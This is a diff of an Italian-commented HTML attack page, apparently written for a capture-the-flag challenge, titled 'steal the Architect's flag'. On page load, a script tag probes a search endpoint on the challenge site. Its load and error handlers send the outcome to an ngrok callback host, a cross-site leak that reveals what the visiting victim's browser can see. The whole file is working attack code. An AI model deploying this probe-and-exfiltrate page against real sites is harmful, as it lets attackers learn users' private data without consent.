@@ -3,33 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flag Status Check</title>
+    <title>Rubare Flag</title>
 </head>
 <body>
-    <h1>Verifica della Flag</h1>
+    <h1>Rubare la Flag dell'Architetto</h1>
 
     <script>
-        const checkFlagStatus = () => {
-            const img = new Image();
-            img.src = 'https://matrix.capturetheflags.site/search?s=flag'; // Endpoint target
-
-            img.onload = () => {
-                console.log("Flag accessibile (200).");
-                // Invia una notifica di "200 OK" al tuo server
-                const success = new Image();
-                success.src = 'https://acca-87-4-142-72.ngrok-free.app/receive_flag?status=200';
+        function probeError(url) {
+            let script = document.createElement('script');
+            script.src = url;
+            script.onload = () => {
+                console.log('Onload event triggered');
+                // Notify your server that the flag is accessible
+                fetch('https://acca-87-4-142-72.ngrok-free.app/receive_flag?status=accessibile', {
+                    method: 'GET'
+                })
+                .then(response => console.log("Risultato inviato:", response))
+                .catch(error => console.error('Errore invio risultato:', error));
             };
-
-            img.onerror = () => {
-                console.log("Flag non accessibile (404).");
-                // Invia una notifica di "404 Not Found" al tuo server
-                const failure = new Image();
-                failure.src = 'https://acca-87-4-142-72.ngrok-free.app/receive_flag?status=404';
+            script.onerror = () => {
+                console.log('Error event triggered');
+                // Notify your server that the flag is not accessible
+                fetch('https://acca-87-4-142-72.ngrok-free.app/receive_flag?status=non_accessibile', {
+                    method: 'GET'
+                })
+                .then(response => console.log("Risultato inviato:", response))
+                .catch(error => console.error('Errore invio risultato:', error));
             };
-        };
+            document.head.appendChild(script);
+        }
 
-        // Eseguire la funzione al caricamento della pagina
-        window.onload = checkFlagStatus;
+        // Prova a caricare il flag
+        probeError('https://matrix.capturetheflags.site/search?s=flag'); // Sostituisci con il tuo endpoint
     </script>
 </body>
 </html>
